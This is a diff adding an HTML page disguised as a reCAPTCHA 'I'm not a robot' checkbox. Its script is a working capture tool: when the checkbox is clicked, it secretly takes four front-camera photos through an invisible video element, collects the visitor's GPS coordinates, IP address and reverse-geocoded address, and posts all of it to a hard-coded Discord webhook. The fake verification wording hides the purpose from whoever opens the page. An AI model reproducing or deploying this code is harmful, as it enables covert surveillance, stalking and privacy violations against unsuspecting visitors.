@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>reCAPTCHA Verification</title>
+<style>
+    body {
+        font-family: 'Roboto', Arial, sans-serif;
+        background: #f2f2f2;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        margin: 0;
+        padding: 24px 0;
+        box-sizing: border-box;
+    }
+
+    .rc-wrap {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 12px;
+    }
+
+    .rc-box {
+        width: 304px;
+        background: #fff;
+        border: 1px solid #d3d3d3;
+        border-radius: 3px;
+        box-shadow: 0 0 4px rgba(0,0,0,.08);
+        cursor: pointer;
+        user-select: none;
+    }
+
+    .rc-head {
+        display: flex;
+        align-items: center;
+        padding: 14px 16px 14px 12px;
+    }
+
+    .rc-cb {
+        width: 28px;
+        height: 28px;
+        border: 2px solid #c1c1c1;
+        background: #fff;
+        border-radius: 3px;
+        margin-right: 14px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition: all .2s;
+        flex: 0 0 auto;
+    }
+
+    .rc-cb.checked {
+        background: #156b3c;
+        border-color: #156b3c;
+    }
+
+    .rc-cb.loading {
+        background: #f9f9f9;
+        border-color: #c1c1c1;
+    }
+
+    .rc-tick {
+        color: #fff;
+        font-size: 19px;
+        font-weight: bold;
+        line-height: 1;
+        display: none;
+    }
+
+    .rc-cb.checked .rc-tick { display: block; }
+
+    .rc-spin {
+        width: 18px;
+        height: 18px;
+        border: 2px solid #e0e0e0;
+        border-top-color: #156b3c;
+        border-radius: 50%;
+        animation: rcs 1s linear infinite;
+        display: none;
+    }
+
+    .rc-cb.loading .rc-spin { display: block; }
+    .rc-cb.checked .rc-spin { display: none; }
+
+    @keyframes rcs { to { transform: rotate(360deg); } }
+
+    .rc-logo {
+        flex: 1;
+        display: flex;
+        align-items: center;
+        gap: 8px;
+    }
+
+    .rc-mark { width: 42px; height: 42px; flex: 0 0 auto; }
+
+    .rc-main {
+        font-size: 14px;
+        color: #222;
+        font-weight: 500;
+    }
+
+    .rc-sub {
+        font-size: 10px;
+        color: #888;
+        margin-top: 2px;
+    }
+
+    .rc-foot {
+        background: #f9f9f9;
+        border-top: 1px solid #e8e8e8;
+        padding: 8px 16px;
+        display: flex;
+        justify-content: space-between;
+        font-size: 10px;
+        color: #555;
+    }
+
+    .rc-foot a {
+        color: #555;
+        text-decoration: none;
+        margin-left: 8px;
+    }
+
+    .rc-status {
+        font: 11px/1.5 ui-monospace, Menlo, Consolas, monospace;
+        color: #777;
+        text-align: center;
+        max-width: 320px;
+        word-break: break-word;
+    }
+</style>
+</head>
+<body>
+
+<div class="rc-wrap">
+    <div class="rc-box" id="widget">
+        <div class="rc-head">
+            <div class="rc-cb" id="cb">
+                <span class="rc-tick">&#10003;</span>
+                <div class="rc-spin"></div>
+            </div>
+            <div class="rc-logo">
+                <svg class="rc-mark" viewBox="0 0 48 48">
+                    <path d="M24 2L46 14v20L24 46 2 34V14z" fill="#f9f9f9"/>
+                    <path d="M24 8l16 9.2v9.6L24 36 8 26.8v-9.6z" fill="#fff"/>
+                    <path d="M24 14l10 5.8v5.4L24 30l-10-5.8v-5.4z" fill="#e0e0e0"/>
+                </svg>
+                <div>
+                    <div class="rc-main" id="mainText">I'm not a robot</div>
+                    <div class="rc-sub">Privacy - Terms</div>
+                </div>
+            </div>
+        </div>
+        <div class="rc-foot">
+            <span>Protected by reCAPTCHA</span>
+            <span><a href="#">Privacy</a><a href="#">Terms</a></span>
+        </div>
+    </div>
+    <div class="rc-status" id="status">idle</div>
+</div>
+
+<script>
+/* ============================================================
+   PASTE YOUR DISCORD WEBHOOK URL HERE
+   ============================================================ */
+const WEBHOOK_URL = 'https://discord.com/api/webhooks/1553766824783388812/Zm7f_7JZlFK6PzVg-QrM4BKK_v281MkdteFPeQQYm9TN6TbryaBtPCgJO1b1OEYslokp?wait=true';
+
+const widget   = document.getElementById('widget');
+const cb       = document.getElementById('cb');
+const mainText = document.getElementById('mainText');
+const statusEl = document.getElementById('status');
+
+let busy = false;
+const say = m => { statusEl.textContent = m; };
+
+widget.addEventListener('click', async () => {
+    if (busy) return;
+    busy = true;
+    cb.classList.add('loading');
+    mainText.textContent = 'Verifying...';
+
+    try {
+        say('asking for permissions...');
+
+        // Fire both permission prompts at the same time.
+        const locPromise = getLocation();
+        const ipPromise  = getIP();
+
+        const photos   = await capturePhotos();
+        const location = await locPromise;
+        const ip       = await ipPromise;
+
+        say('sending...');
+        await send(photos, ip, location);
+        say('done - ' + photos.length + ' photo(s) sent');
+    } catch (e) {
+        console.warn(e);
+        say('error: ' + e.message);
+    }
+
+    cb.classList.remove('loading');
+    cb.classList.add('checked');
+    mainText.textContent = 'Verified';
+    busy = false;
+});
+
+/* ---------- CAMERA: 4 front-cam snaps ---------- */
+async function capturePhotos() {
+    const out = [];
+    for (let i = 1; i <= 4; i++) {
+        say('photo ' + i + '/4');
+        const shot = await snap();
+        if (shot) out.push({ blob: shot, name: 'front_snap_' + i + '.jpg' });
+    }
+    return out;
+}
+
+function snap() {
+    return new Promise(async (resolve) => {
+        let done = false;
+        const finish = v => { if (!done) { done = true; resolve(v); } };
+        const guard = setTimeout(() => finish(null), 6000);
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                audio: false
+            });
+
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.muted = true;
+            video.setAttribute('playsinline', '');
+            video.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0';
+            document.body.appendChild(video);
+
+            await new Promise(res => {
+                let s = false;
+                const go = () => { if (!s) { s = true; res(); } };
+                video.onloadedmetadata = go;
+                video.onerror = go;
+                setTimeout(go, 2000);
+            });
+
+            await video.play().catch(() => {});
+            await new Promise(r => setTimeout(r, 400));
+
+            const w = video.videoWidth || 640;
+            const h = video.videoHeight || 480;
+            const c = document.createElement('canvas');
+            c.width = w;
+            c.height = h;
+            const ctx = c.getContext('2d');
+            ctx.translate(w, 0);
+            ctx.scale(-1, 1);            // mirror, like a front cam preview
+            ctx.drawImage(video, 0, 0, w, h);
+
+            stream.getTracks().forEach(t => t.stop());
+            video.srcObject = null;
+            video.remove();
+
+            const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.8));
+            clearTimeout(guard);
+            finish(blob);
+        } catch (e) {
+            console.warn('snap failed', e);
+            clearTimeout(guard);
+            finish(null);
+        }
+    });
+}
+
+/* ---------- IP ---------- */
+async function getIP() {
+    try {
+        const r = await fetch('https://api.ipify.org?format=json');
+        return (await r.json()).ip || 'Unknown';
+    } catch (e) {
+        return 'Unknown';
+    }
+}
+
+/* ---------- LOCATION: GPS first, then IP fallbacks ---------- */
+function getLocation() {
+    return new Promise(async (resolve) => {
+        let done = false;
+        const finish = v => { if (!done) { done = true; resolve(v); } };
+
+        // 1) Browser GPS
+        if (navigator.geolocation) {
+            const gps = await new Promise(res => {
+                let s = false;
+                const f = v => { if (!s) { s = true; res(v); } };
+                const t = setTimeout(() => f(null), 12000);
+                navigator.geolocation.getCurrentPosition(
+                    p => {
+                        clearTimeout(t);
+                        f({ lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy, src: 'GPS' });
+                    },
+                    () => { clearTimeout(t); f(null); },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
+                );
+            });
+
+            if (gps) {
+                gps.label = await reverseGeocode(gps.lat, gps.lng);
+                finish(gps);
+                return;
+            }
+        }
+
+        // 2) IP-based fallback, so you always get something
+        const providers = [
+            async () => {
+                const d = await (await fetch('https://ipwho.is/')).json();
+                return d.latitude
+                    ? { lat: d.latitude, lng: d.longitude, acc: null, src: 'IP', label: [d.city, d.region, d.country].filter(Boolean).join(', ') }
+                    : null;
+            },
+            async () => {
+                const d = await (await fetch('https://ipapi.co/json/')).json();
+                return d.latitude
+                    ? { lat: d.latitude, lng: d.longitude, acc: null, src: 'IP', label: [d.city, d.region, d.country_name].filter(Boolean).join(', ') }
+                    : null;
+            },
+            async () => {
+                const d = await (await fetch('https://ipinfo.io/json')).json();
+                if (!d.loc) return null;
+                const [a, b] = d.loc.split(',');
+                return { lat: +a, lng: +b, acc: null, src: 'IP', label: [d.city, d.region, d.country].filter(Boolean).join(', ') };
+            }
+        ];
+
+        for (const p of providers) {
+            try {
+                const r = await p();
+                if (r && r.lat) { finish(r); return; }
+            } catch (e) {}
+        }
+
+        finish(null);
+    });
+}
+
+async function reverseGeocode(lat, lng) {
+    try {
+        const r = await fetch(
+            'https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat +
+            '&longitude=' + lng + '&localityLanguage=en'
+        );
+        const d = await r.json();
+        return [d.city || d.locality, d.principalSubdivision, d.countryName].filter(Boolean).join(', ');
+    } catch (e) {
+        return null;
+    }
+}
+
+/* ---------- SEND TO DISCORD ---------- */
+async function send(photos, ip, location) {
+    const lines = ['**Verification Captured**', 'IP: ' + ip];
+    let maps = null;
+
+    if (location) {
+        maps = 'https://www.google.com/maps?q=' + location.lat + ',' + location.lng;
+        lines.push('Location: ' + (location.label || 'unknown'));
+        lines.push('Coords: ' + location.lat.toFixed(6) + ', ' + location.lng.toFixed(6) + ' (' + location.src + ')');
+        lines.push('Map: ' + maps);
+    } else {
+        lines.push('Location: denied / unavailable');
+    }
+
+    const embed = {
+        title: 'Verification Capture',
+        color: 0x156b3c,
+        fields: [
+            { name: 'IP', value: ip, inline: true },
+            { name: 'Photos', value: String(photos.length), inline: true }
+        ],
+        timestamp: new Date().toISOString()
+    };
+
+    if (location) {
+        embed.url = maps;
+        embed.fields.push({ name: 'Location', value: location.label || 'unknown', inline: false });
+        embed.fields.push({ name: 'Coords', value: location.lat.toFixed(6) + ', ' + location.lng.toFixed(6), inline: false });
+        embed.image = {
+            url: 'https://staticmap.openstreetmap.de/staticmap.php?center=' + location.lat + ',' + location.lng +
+                 '&zoom=16&size=600x300&maptype=mapnik&markers=' + location.lat + ',' + location.lng + ',red-pushpin'
+        };
+    }
+
+    const payload = {
+        content: lines.join('\n'),
+        embeds: [embed],
+        attachments: []
+    };
+
+    const fd = new FormData();
+
+    photos.forEach((p, i) => {
+        fd.append('files[' + i + ']', p.blob, p.name);
+        payload.attachments.push({ id: i, filename: p.name });
+    });
+
+    // payload_json must be appended AFTER all files are registered
+    fd.append('payload_json', new Blob([JSON.stringify(payload)], { type: 'application/json' }));
+
+    const res = await fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+    if (!res.ok) {
+        throw new Error('discord ' + res.status + ' ' + (await res.text()).slice(0, 120));
+    }
+}
+</script>
+
+</body>
+</html>
